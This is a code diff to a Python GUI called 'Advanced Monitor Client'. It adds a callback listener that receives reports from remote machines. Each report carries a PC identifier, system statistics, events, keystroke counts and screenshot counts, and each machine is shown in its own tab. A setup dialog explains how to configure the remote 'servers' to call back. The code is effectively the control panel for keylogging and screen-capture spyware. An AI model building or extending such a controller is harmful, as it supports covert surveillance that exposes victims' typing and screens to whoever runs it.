@@ -12,6 +12,9 @@ import queue
 import logging
 from pathlib import Path
 
+# Import callback listener
+from .callback_listener import CallbackListener
+
 class ModernTheme:
     """Modern dark theme for the GUI"""
     
@@ -459,6 +462,59 @@ class EnhancedServerTab:
         if len(lines) > 100:
             # Keep only last 100 lines
             self.log_text.delete("1.0", f"{len(lines) - 100}.0")
+    
+    def update_from_callback(self, data):
+        """Update tab with data from callback"""
+        try:
+            # Store PC ID for future reference
+            self.last_pc_id = data.get('pc_id')
+            
+            # Log the callback reception
+            timestamp = data.get('timestamp', 'Unknown')
+            self.log_message(f"Callback received: {timestamp}")
+            
+            # Update connection status
+            self.connection_status.set("Connected (Active)")
+            
+            # Update monitoring data if available
+            monitoring_data = data.get('monitoring', {})
+            if monitoring_data:
+                # Update CPU usage if available
+                cpu_usage = monitoring_data.get('cpu_usage')
+                if cpu_usage is not None and self.cpu_widget:
+                    self.cpu_widget.add_data(float(cpu_usage))
+                
+                # Update memory usage if available  
+                memory_usage = monitoring_data.get('memory_usage')
+                if memory_usage is not None and self.memory_widget:
+                    self.memory_widget.add_data(float(memory_usage))
+                
+                # Update network activity if available
+                network_activity = monitoring_data.get('network_activity', 0)
+                if self.network_widget:
+                    self.network_widget.add_data(float(network_activity))
+            
+            # Log events if present
+            events = data.get('events', [])
+            for event in events[-5:]:  # Show last 5 events
+                event_msg = event.get('message', 'Unknown event')
+                self.log_message(f"Event: {event_msg}")
+            
+            # Log keystrokes count if present
+            keystroke_count = data.get('keystroke_count', 0)
+            if keystroke_count > 0:
+                self.log_message(f"Keystrokes logged: {keystroke_count}")
+            
+            # Log screenshot count if present
+            screenshot_count = data.get('screenshot_count', 0)
+            if screenshot_count > 0:
+                self.log_message(f"Screenshots taken: {screenshot_count}")
+                
+        except Exception as e:
+            self.log_message(f"Error updating from callback: {e}")
+            print(f"Callback update error: {e}")
+            import traceback
+            traceback.print_exc()
 
 class EnhancedMainWindow:
     """Enhanced main window with modern GUI"""
@@ -478,8 +534,65 @@ class EnhancedMainWindow:
         # Create interface
         self._create_interface()
         
+        # Initialize and start callback listener
+        self.callback_listener = CallbackListener(self)
+        self._start_callback_listener()
+        
         # Setup callbacks and updates
         self._setup_callbacks()
+    
+    def _start_callback_listener(self):
+        """Start the callback listener"""
+        try:
+            if self.callback_listener.start():
+                local_ip = self.callback_listener.get_local_ip()
+                port = self.callback_listener.config['port']
+                self.status_bar.update_status(f"🟢 Listening on {local_ip}:{port}")
+                self.status_bar.update_connection("Ready for connections", ModernTheme.COLORS['success'])
+                print(f"✅ Callback listener started on {local_ip}:{port}")
+                
+                # Show setup info if this is first run
+                self._show_setup_info()
+            else:
+                self.status_bar.update_status("❌ Failed to start callback listener")
+                self.status_bar.update_connection("Listener failed", ModernTheme.COLORS['error'])
+                messagebox.showerror(
+                    "Error",
+                    "Failed to start callback listener!\n\n"
+                    "The client cannot accept connections from servers."
+                )
+        except Exception as e:
+            print(f"Error starting callback listener: {e}")
+            self.status_bar.update_status(f"❌ Callback listener error: {e}")
+    
+    def _show_setup_info(self):
+        """Show setup information for first-time users"""
+        # Check if this is first run
+        if not hasattr(self, '_setup_shown'):
+            local_ip = self.callback_listener.get_local_ip()
+            port = self.callback_listener.config['port']
+            key = self.callback_listener.config['callback_key']
+            
+            setup_msg = (
+                f"🎯 ADVANCED MONITOR CLIENT READY\n\n"
+                f"Listening for server connections on:\n"
+                f"• IP: {local_ip}\n"
+                f"• Port: {port}\n\n"
+                f"To connect servers, configure their callback_config.json:\n\n"
+                f'{{\n'
+                f'  "enabled": true,\n'
+                f'  "callback_url": "http://{local_ip}:{port}",\n'
+                f'  "callback_key": "{key}"\n'
+                f'}}\n\n'
+                f"Servers will automatically appear as new tabs!"
+            )
+            
+            messagebox.showinfo("Client Ready", setup_msg)
+            self._setup_shown = True
+    
+    def update_status_bar(self, message):
+        """Update status bar (for compatibility with callback listener)"""
+        self.status_bar.update_status(message)
     
     def _create_interface(self):
         """Create main interface"""
@@ -578,6 +691,45 @@ class EnhancedMainWindow:
             
             self.status_bar.update_status(f"Connected to {server_name}")
             server_tab.log_message("Connected to server")
+    
+    def process_callback_data(self, data):
+        """Process incoming callback data and update GUI"""
+        try:
+            pc_id = data.get('pc_id')
+            pc_name = data.get('pc_name', 'Unknown')
+            
+            print(f"[*] Processing callback data for PC: {pc_id} ({pc_name})")
+            
+            # Find the matching tab by server name or PC ID
+            matching_tab = None
+            for name, tab in self.server_tabs.items():
+                if hasattr(tab, 'last_pc_id') and tab.last_pc_id == pc_id:
+                    matching_tab = tab
+                    break
+                elif name == pc_name:
+                    matching_tab = tab
+                    # Store PC ID for future reference
+                    tab.last_pc_id = pc_id
+                    break
+            
+            if matching_tab:
+                print(f"[*] Found matching tab, updating data")
+                # Update the tab with callback data
+                if hasattr(matching_tab, 'update_from_callback'):
+                    matching_tab.update_from_callback(data)
+                else:
+                    # Fallback: just log the activity
+                    matching_tab.log_message(f"Received callback data")
+                
+                # Update status
+                self.status_bar.update_status(f"Updated data from {pc_name}")
+            else:
+                print(f"[!] No matching tab found for PC: {pc_id} ({pc_name})")
+                
+        except Exception as e:
+            print(f"Error processing callback data: {e}")
+            import traceback
+            traceback.print_exc()
     
     def _add_server_dialog(self):
         """Show add server dialog"""
